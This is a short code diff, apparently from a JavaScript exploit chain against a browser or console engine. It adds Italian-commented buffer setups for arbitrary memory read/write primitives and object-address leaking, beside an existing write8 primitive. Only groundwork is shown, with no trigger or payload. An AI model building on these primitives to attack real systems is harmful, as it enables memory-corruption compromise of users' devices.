@@ -31,6 +31,16 @@ import { cstr, jstr } from './module/memtools.mjs';
 import { page_size, context_size } from './module/offset.mjs';
 import { Chain } from './module/chain.mjs';
 
+// Setup memoria per primitive read/write
+var expl_buffer = new ArrayBuffer(0x1000);
+var expl_master = new Uint32Array(expl_buffer, 0, 6); // Controlla indirizzi
+var expl_slave = new Uint32Array(expl_buffer, 0x20, 2); // Memorizza valori
+
+// Setup per l'object leaking
+var obj_buffer = new ArrayBuffer(0x1000);
+var obj_master = new Uint32Array(obj_buffer, 0, 6);
+var obj_slave = { obj: null }; // Usato per esporre l'indirizzo
+
  var prim = {
   write8: function (addr, value) {
    expl_master[4] = addr.low;
